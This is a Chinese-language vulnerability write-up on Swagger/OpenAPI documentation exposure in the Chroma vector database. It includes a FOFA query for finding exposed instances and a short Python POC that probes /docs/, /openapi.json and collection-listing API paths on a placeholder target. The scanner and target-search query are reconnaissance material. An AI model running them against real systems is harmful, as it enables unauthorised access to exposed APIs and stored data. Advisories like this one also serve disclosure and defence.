# Chroma DB swagger 敏感信息泄露漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | Chroma DB swagger 敏感信息泄露漏洞 |
| 漏洞类型 | 敏感信息泄露 |
| 影响组件 | swagger docs |
| 影响版本 | Chroma DB |

## 漏洞概述

Chroma DB 是一款开源向量数据库。系统存在 swagger 敏感信息泄露漏洞，攻击者可通过访问 swagger 文档获取 API 接口信息，可能导致进一步攻击。

## fofa查询语句

```
Chroma
```

## 漏洞复现

### POC

```python
import requests

def check(target):
    paths = [
        "/api/v2/tenants/default_tenant/databases/default_database/collections",
        "/api/v1/collections?tenant=default_tenant&database=default_database",
        "/docs/",
        "/openapi.json"
    ]
    for path in paths:
        url = target + path
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                print(f"[+] {url} 存在swagger泄露")
        except:
            pass

if __name__ == "__main__":
    check("http://target.com:8000")
```

### 漏洞特征

- 路径：/docs/、/openapi.json、/api/*

## 修复建议

1. 打补丁
2. 限制 swagger 文档访问
3. 实施认证机制
